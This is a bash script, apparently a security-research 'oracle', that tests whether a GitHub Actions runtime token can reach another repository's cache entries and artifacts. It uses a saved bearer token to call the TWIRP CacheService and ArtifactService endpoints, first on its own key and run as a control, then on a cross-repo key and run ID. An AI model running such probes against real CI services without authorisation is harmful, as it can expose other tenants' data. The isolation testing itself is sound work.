#!/usr/bin/env bash
# T1 oracle FINAL-2: cache v2 TWIRP on the signed ACTIONS_RUNTIME_URL base.
set -u
TOK=$(cat reports/runtime-token.txt 2>/dev/null || true)
if [ -z "$TOK" ]; then
  echo "no runtime token in action context -> isolation confirmed"
  exit 0
fi
RUNTIME_URL=$(python3 -c "import json;print(json.load(open('reports/action-env.json')).get('ACTIONS_RUNTIME_URL',''))" 2>/dev/null)
echo "runtime base signed-path present: $(echo "$RUNTIME_URL" | grep -cE 'https://[^/]+/.+')"

VER='deadbeef00000000000000000000000000000000000000000000000000000000'
KEY_A="cross-a-${GITHUB_RUN_ID}"
KEY_B='cross-b-1'

tw() { curl -sS -m 20 -o /tmp/t.out -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d "$2" \
  "${RUNTIME_URL}twirp/github.actions.results.api.v1.$1" 2>/dev/null || echo 000; }

echo "== [own control] TWIRP CacheService"
C=$(tw "CacheService/CreateCacheEntry" "{\"key\":\"$KEY_A\",\"version\":\"$VER\",\"size\":14}")
echo "CreateCacheEntry own: $C"; head -c 250 /tmp/t.out; echo
C=$(tw "CacheService/GetCacheEntry" "{\"key\":\"$KEY_A\",\"version\":\"$VER\"}")
echo "GetCacheEntry own: $C"; head -c 250 /tmp/t.out; echo

echo "== [T1-cross] GetCacheEntry cross-repo key"
C=$(tw "CacheService/GetCacheEntry" "{\"key\":\"$KEY_B\",\"version\":\"$VER\"}")
echo "GetCacheEntry cross: $C   <-- 200=HIGH FINDING / not-found=isolated"
head -c 250 /tmp/t.out; echo

echo "== [T1-cross] ListArtifacts own vs cross (runtime url)"
for RID in "$GITHUB_RUN_ID" "${B_RUN_ID:-0}"; do
  tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
  C=$(tw "ArtifactService/ListArtifacts" "{\"workflow_run_id\":$RID}")
  echo "ListArtifacts run=$RID ($tag): $C"; head -c 250 /tmp/t.out; echo
done
rm -f reports/runtime-token.txt
echo "ORACLE FINAL2 DONE (token file removed)"
